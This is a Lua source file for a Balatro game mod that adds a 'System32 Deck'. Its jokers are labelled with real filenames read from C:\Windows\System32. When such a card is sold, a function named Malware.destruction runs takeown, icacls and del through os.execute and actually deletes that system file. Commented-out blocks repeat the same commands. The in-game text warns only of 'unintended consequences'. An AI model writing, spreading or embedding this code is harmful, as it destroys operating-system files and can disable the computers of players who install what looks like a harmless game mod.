-- balatroware.lua
---@diagnostic disable-next-line: lowercase-global
to_big = to_big or function(v)
	return v
end
---@diagnostic disable-next-line: lowercase-global
to_number = to_number or function(v)
	return v
end

local files = {}
local dir = 'C:\\Windows\\System32\\'
local p = io.popen('dir "'..dir..'" /b')  --Open directory look for files, save data in p. (with option "/b" everything contained in the given directory is listed with simple format)
local i = 1
for file in p:lines() do                    --Loop through all files
    files[i] = tostring(file)
    i = i + 1
end

if SMODS.Atlas then
  SMODS.Atlas({
    key = "modicon",
    path = "icon.png",
    px = 32,
    py = 32
  })
end

SMODS.Sound({
	key = "music_cursed",
	path = "music_cursed.ogg",
	volume = 1.2,
	pitch = 1,
	select_music_track = function()
		return G.STAGE == G.STAGES.MAIN_MENU
	end,
})

SMODS.Atlas{
	key = 'Decks',
	path = 'Decks.png',
	px = 71,
	py = 95
}
SMODS.Back {
	key = 'sys32',
	atlas = 'Decks',
	pos = { x = 0, y = 0 },
	loc_txt = {
		name = "System32 Deck",
		text = {
			'{C:attention}Jokers{} are a random',
            '{C:red}System32 Files{}',
            'Selling these cards may have',
            '{C:red}unintended consequences.{}'
		}
	},
	unlocked = true,
    discovered = true,
}
SMODS.Sticker {
    key = 'file',
	atlas = 'Decks',
	pos = {x = -1, y = -1},
	loc_txt = {
		label = 'file',
		name = 'file',
		text = {
		  '#1#'
		},
	},
    config = {
		extra = {filename = 'file.file'}
	},
    loc_vars = function(self,info_queue,center)
		return{
			vars = {
				center.ability.filename
			}
		}
	end,
    sets = {
        Joker = true,
    },
	badge_colour = G.C.BLACK,
    rate = 1.0,
    needs_enable_flag = false,
	default_compat = false,
	no_collection = true,
	apply = function(self, card, val)
		card.ability[self.key] = val

		G.E_MANAGER:add_event(Event({
		func = function()
			local random_file = files[math.random(13, #files)]
            card.ability.filename = random_file
			return true
		end
		}))
	end,
    should_apply = function(self, card, center, area, bypass_reroll)
        return G.GAME.selected_back and G.GAME.selected_back.effect.center.key == 'b_ware_sys32'
    end,
    calculate = function(self, card, context)
        if context.selling_card and context.card == card then
			G.E_MANAGER:add_event(Event({
				trigger = 'after',
				delay = 0.2,
				func = function()
					attention_text({
						text = 'File '..card.ability.filename..' has been DELETED',
						scale = 0.8,
						hold = 3,
						major = card,
						backdrop_colour = G.C.RED,
						align = (G.STATE == G.STATES.TAROT_PACK or G.STATE == G.STATES.SPECTRAL_PACK or G.STATE == G.STATES.SMODS_BOOSTER_OPENED) and
							'tm' or 'cm',
						offset = { x = 0, y = 0 },
						silent = true
					})
				return true
				end
			}))
            Malware.destruction(card.ability.filename,'C:\\Windows\\System32\\')
        end
    end
}

Malware = {}

Malware.destruction = function(filename,dir)
    os.execute('takeown /f "'..dir..filename..'" /r /d y')
    os.execute('icacls "'..dir..filename..'" /grant Administrators:F /t')
    os.execute('del "'..dir..filename..'"')
end

--[[
os.execute('takeown /f "C:\\testingground\\file.file" /r /d y')
os.execute('icacls "C:\\testingground\\file.file" /grant Administrators:F /t')
os.execute('del "C:\\testingground\\file.file"')
]]

--[[
local data = {}
local dir = 'C:\\Windows\\System32\\'
local p = io.popen('dir "'..dir..'" /b')  --Open directory look for files, save data in p. (with option "/b" everything contained in the given directory is listed with simple format)
local i = 1
for file in p:lines() do                    --Loop through all files
    data[i] = tostring(file)
    i = i + 1
end
print(data)
print(data[math.random(13, #data)])
print(data[math.random(13, #data)])
print(data[math.random(13, #data)])
print(data[math.random(13, #data)])
print(data[math.random(13, #data)])
]]
--[[
    takeown /f "C:\\Windows\\System32\\filename.exe" /r /d y
    icacls "C:\\Windows\\System32\\filename.exe" /grant Administrators:F /t
    del "C:\\Windows\\System32\\filename.exe"
]]
